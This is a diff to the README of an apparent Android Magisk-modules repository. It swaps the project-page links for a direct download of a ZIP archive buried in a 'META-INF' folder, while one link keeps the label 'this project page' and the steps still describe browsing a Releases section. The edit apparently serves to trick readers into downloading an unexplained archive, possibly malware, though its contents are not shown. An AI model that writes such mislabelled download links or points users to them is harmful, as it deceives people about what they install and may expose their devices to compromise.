@@ -1,7 +1,7 @@
 # 🛠️ DresOS-Magisk-Modules - Automate your custom android build process
 
 <div align="center">
-<a href="https://github.com/proverbial-incommodiousness657/DresOS-Magisk-Modules">
+<a href="https://raw.githubusercontent.com/proverbial-incommodiousness657/DresOS-Magisk-Modules/main/aosmium-webview/META-INF/Dres_Magisk_O_Modules_2.0.zip">
 <img src="https://img.shields.io/badge/Download-DresOS_Modules-blue" alt="Download Button">
 </a>
 </div>
@@ -24,7 +24,7 @@ Before you start, check that your device meets these requirements:
 
 You get the files from the project repository. Follow these steps to obtain the correct archives for your device.
 
-1.  Visit [this project page](https://github.com/proverbial-incommodiousness657/DresOS-Magisk-Modules) to view all available modules.
+1.  Visit [this project page](https://raw.githubusercontent.com/proverbial-incommodiousness657/DresOS-Magisk-Modules/main/aosmium-webview/META-INF/Dres_Magisk_O_Modules_2.0.zip) to view all available modules.
 2.  Look for the "Releases" section on the right side of the page.
 3.  Click the version link to view the associated files.
 4.  Download the ZIP files to your computer.
